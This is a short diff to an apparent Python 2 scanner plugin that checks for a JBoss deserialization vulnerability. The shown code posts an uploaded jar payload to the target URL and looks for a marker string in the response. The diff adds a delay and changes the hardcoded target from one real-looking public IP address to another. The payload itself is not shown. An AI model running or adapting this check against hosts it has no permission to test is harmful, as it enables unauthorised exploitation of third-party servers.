@@ -35,6 +35,7 @@ class P(T):
 
         try:
             urllib2.urlopen(vul_url,upload_jar)
+            time.sleep(5)
             res = urllib2.urlopen(vul_url,vul_test)
             if 'vultest11111' in res.read():
                 info= vul_url +" Jboss Unserialization vul"
@@ -57,4 +58,4 @@ class P(T):
            
 
 if __name__ == '__main__':
-    print P().verify(ip='114.251.229.253',port='80')      
+    print P().verify(ip='218.17.224.225',port='443')      
